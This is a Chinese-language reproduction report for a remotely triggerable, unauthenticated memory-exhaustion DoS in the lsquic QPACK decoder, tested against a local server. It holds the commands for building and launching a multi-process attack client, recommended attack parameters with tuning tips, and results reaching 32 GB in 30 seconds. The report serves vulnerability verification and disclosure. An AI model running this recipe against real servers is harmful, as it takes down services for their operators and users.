# QPACK malloc DoS — 复现报告

## 漏洞概述

lsquic QPACK 解码器在处理 `Insert With Name Reference` 指令时，因无符号整数下溢绕过容量检查，导致攻击者可控制 `malloc` 大小（最大 ~16MB/次），通过大量并发连接耗尽服务端内存。

---

## 测试环境

| 项目 | 内容 |
|------|------|
| 服务端 | `http_server` (lsquic, ~/tmp/lsquic/) |
| 客户端 | `qdos_client` (Go, quic-go) |
| 服务端地址 | `127.0.0.1:12345` |
| OS | Linux |
| QUIC 版本 | v1 (0x00000001) |

---

## 测试步骤

### 1. 启动服务端

```bash
cd ~/tmp/lsquic
./bin/http_server -r /tmp/www -s 0.0.0.0:12345 \
  -c localhost,/tmp/server_cert.pem,/tmp/server_key.pem -L debug
```

如果无证书，先生成：

```bash
openssl req -x509 -newkey rsa:2048 -keyout /tmp/server_key.pem \
  -out /tmp/server_cert.pem -days 365 -nodes -subj "/CN=localhost"
```

### 2. 构建客户端

```bash
cd /home/youngseaz/lsquic/fuzz/qdos_go
go build -o qdos_client .
```

#### 构建产物

| 文件 | 说明 |
|------|------|
| `qdos_client` | 二进制可执行文件 (~8.5 MB) |
| `main.go` | 源代码 |
| `go.mod` | Go 模块定义（依赖本地 quic-go） |

#### 依赖

- Go 1.22+
- quic-go（位于 `/home/youngseaz/quic-go/`，通过 `go.mod` 中 `replace` 指令引用）
- 无需安装额外的系统依赖

### 3. 验证漏洞触发（单连接）

```bash
./qdos_client -w 10 -touch 1 -c 3 -hold 5000
```

预期输出：
```
[+] QUIC connection established!
[*] Server malloc(~16777257 bytes = 16.0 MB)
[+] Malicious QPACK data sent!
[*] 3 connections
```

### 4. 内存耗尽测试（32GB）

```bash
# 10 个并行进程，各 200 workers，hold 30 秒
for i in $(seq 1 10); do
    ./qdos_client -w 200 -touch 4 -c 1000 -hold 30000 > /tmp/qdos_32g_${i}.log 2>&1 &
done
```

### 5. 监控内存

```bash
watch -n5 'cat /proc/$(pgrep http_server)/status | grep -E "VmRSS|VmSize"'
```

---

## 测试结果

### 单连接测试

| 指标 | 值 |
|------|-----|
| 每次 malloc | ~16,777,257 bytes (16 MB) |
| 连接建立 | ✅ 成功 |
| QPACK 数据发送 | ✅ 成功 |
| 服务端响应 | `push entry, capacity 16777257` |

### 32GB 压力测试

**命令**: 10 进程并行, 各 `-w 200 -touch 4 -c 1000 -hold 30000`

| 时间 | VmSize | VmRSS | 说明 |
|------|--------|-------|------|
| 0s | 13 MB | 7 MB | 基线 |
| 15s | 19,618 MB (19 GB) | 687 MB | 快速上涨 |
| **30s** | **32,890 MB (31.4 GB)** | 687 MB | **🎯 超过 32GB** |
| 峰值 | **32,890 MB (31.4 GB)** | 687 MB | VmPeak |

### 内存随时间变化曲线

```
VmSize (GB)
 32 ┤                                    🎯
 28 ┤                                 ↗
 24 ┤                              ↗
 20 ┤                           ↗
 16 ┤                        ↗
 12 ┤                     ↗
  8 ┤                  ↗
  4 ┤               ↗
  0 ┤───┬───┬───┬───┬───┬───┬───
      0   5   10  15  20  25  30   (秒)
```

---

## 攻击参数说明

| 参数 | 含义 | 推荐值 |
|------|------|--------|
| `-w` | 并行 worker 数（每进程） | 200 |
| `-touch` | 触碰数据 MB（影响 RSS） | 4 |
| `-c` | 目标连接数 | 1000 |
| `-hold` | 每连接保持毫秒数 | 30000 |

### 关键注意事项

1. **`-w` 不能太大**：单进程超过 200 workers 会导致 quic-go Transport 内部过载，连接超时
2. **多进程扩展**：每进程独立 UDP socket，互不干扰。32GB = 10 进程 × 200 workers
3. **hold 时间**：必须 ≥ 30s 才能覆盖服务端 idle timeout，防止连接被提前回收
4. **`top` 看 VIRT 列**：内存上涨在虚拟内存 (VmSize/VIRT)，不是 RES（物理内存在 `-touch` 为正时才增长）

---

## 测试结论

| 项目 | 结论 |
|------|------|
| 漏洞存在 | ✅ 确认 |
| 可远程触发 | ✅ 通过 QUIC 网络 |
| 无需认证 | ✅ 握手后直接发送 QPACK 数据即可 |
| 无需修改服务端 | ✅ 默认配置即可触发 |
| 内存耗尽效果 | ✅ 30 秒内达 32GB |
| 服务端连接上限 | ❌ 无，可持续消耗至 OOM |
